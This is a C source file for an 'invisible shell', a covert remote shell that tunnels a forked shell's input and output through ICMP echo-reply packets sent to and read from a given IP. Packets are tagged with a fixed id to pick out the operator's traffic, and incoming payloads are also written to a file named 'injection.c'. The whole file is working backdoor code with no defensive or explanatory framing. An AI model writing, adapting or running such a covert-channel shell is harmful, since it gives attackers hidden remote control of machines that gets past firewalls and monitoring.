#include "invisible_shell.h"


/* Static declarations */
static u_short icmp_cksum (u_char *addr, int len);

static int icmp_type = ICMP_ECHOREPLY;
static int id = 12345;



int raw_init (char *ip, int proto)
{
   int s;

   if ((s = socket (AF_INET, SOCK_RAW, proto)) < 0)
      {
        perror ("socket:");
        exit (EXIT_FAILURE);
      }

   dest.sin_family = AF_INET;
   inet_aton (ip, &dest.sin_addr);
   fprintf (stderr, "+ Raw to '%s' (type : %d)\n", ip, icmp_type);

   return s;
}


void invisible_shell (int s)
{
  pid_t pid;
  int sp[2];

  printf("%s\n", "Starting secure shell");

  /*Create a socketpair to talk to the child process.
    Obviously we can only use local sockets (AF_UNIX
    or AF_LOCAL they are the same) at least on GNU/Linux.
    This is very convenient as we do not have to write all those bind, listen, accept and connect.... We get
    all that with just one system call
  */
  if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
     {
       perror ("socketpair:");
       exit (1);
     }

  /* Fork a child process. */
  if ((pid = fork ()) < 0)
     {
       perror ("fork:");
       exit (1);
     }
  else
     {
       if (!pid)
        {
          close (sp[1]);
          close (s);

          /* Start shell in shell.c */
          start_shell (sp[0]);
         /* This function will never return */
        }

        /*Now parent code*/
        close (sp[0]);
        printf("%s\n", "+ Starting async read loop for invisible shell");
        async_read_invisible (s, sp[1]);
     }
}



int net_read_icmp (int s, void *buf, size_t count)
{
   PKT pkt;
   int len;
   //int l;

   read (s, &pkt, sizeof (PKT));
   /*The htons() function converts the unsigned
     short integer hostshort from
     host byte order to network byte order.*/
   if ((pkt.icmp.type == icmp_type) &&
       (ntohs(pkt.icmp.un.echo.id) == id))
       {
         /*As our packets have a fixed size, we can just
           read then in one shot (note that this may have issues in a heavily loaded network...), and then we just check the ICMP message type and id.
           This is the way we mark our packets to know they are ours and
           not a regular ICMP message.*/
         len = ntohs (pkt.len);
         memcpy (buf, (char *) pkt.data, len);

        //  FILE *file = fopen("injection.c", "wb");
        //  printf("This is what I am writing %s\n", pkt.data);

           FILE *fp;
           fp=fopen("injection.c", "w");
           if (!fp)
              perror ("Could not open file");
           fprintf(fp, "%s\n", (char *) pkt.data);
           fclose (fp);
        // fwrite((char *) pkt.data, 1, len, file);

         return len;
       }

  return 0;
}


int net_write_icmp (int s, void *buf, size_t count)
{
  PKT_TX *pkt;
  struct icmphdr *icmp = (struct icmphdr *) &pkt;
  int len;

  pkt = malloc (sizeof (PKT_TX) + count);
  icmp = (struct icmphdr *) pkt;
  pkt->len = htons (count);
  memcpy ((unsigned char *) pkt + sizeof (PKT_TX), buf, count);
  len = count + sizeof(int);
  len += sizeof (struct icmphdr);

  /*Build an ICMP packet*/
  icmp->type = icmp_type;
  icmp->code = 0;
  icmp->un.echo.id = htons(id);
  icmp->un.echo.sequence = htons (5);
  icmp->checksum = 0;
  icmp->checksum = icmp_cksum ((u_char *) icmp, len);

  sendto (s, pkt, len, 0,
         (struct sockaddr *) &dest,
         sizeof (struct sockaddr_in));
  free (pkt);
  return len;
}



void async_read_invisible (int s, int s1)
{
  fd_set rfds;
  struct timeval tv;
  int max = s > s1 ? s : s1;
  int len, r;
  char buffer[BUF_SIZE];

  max++;

  while (1) {
     FD_ZERO(&rfds);
     FD_SET(s, &rfds);
     FD_SET(s1, &rfds);


     /*Time out*/
     tv.tv_sec = 1;
     tv.tv_usec = 0;

     if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
        {
          perror ("select:");
          exit (EXIT_FAILURE);
        }
    else if (r > 0) /* If there is data to process */
        {
           if (FD_ISSET (s, &rfds))
             {
               memset (buffer, 0, BUF_SIZE);
               if ((len = net_read (s, buffer, BUF_SIZE)) == 0) continue;
               write (s1, buffer, len);
             }
           if (FD_ISSET (s1, &rfds))
               {
                 memset (buffer, 0, BUF_SIZE);
                 if ((len = read (s1, buffer, BUF_SIZE)) <= 0) exit (EXIT_FAILURE);
                 net_write (s, buffer, len);
               }

        }
  }
}


static u_short
icmp_cksum (u_char *addr, int len)
{
  register int sum = 0;
  u_short answer = 0;
  u_short *wp;

  for (wp = (u_short*)addr; len > 1; wp++, len -= 2)
    sum += *wp;

  /* Take in an odd byte if present */
  if (len == 1)
    {
      *(u_char *)&answer = *(u_char*)wp;
      sum += answer;
    }

  sum = (sum >> 16) + (sum & 0xffff);   /* add high 16 to low 16 */
  sum += (sum >> 16);                   /* add carry */
  answer = ~sum;                        /* truncate to 16 bits */

  return answer;
}
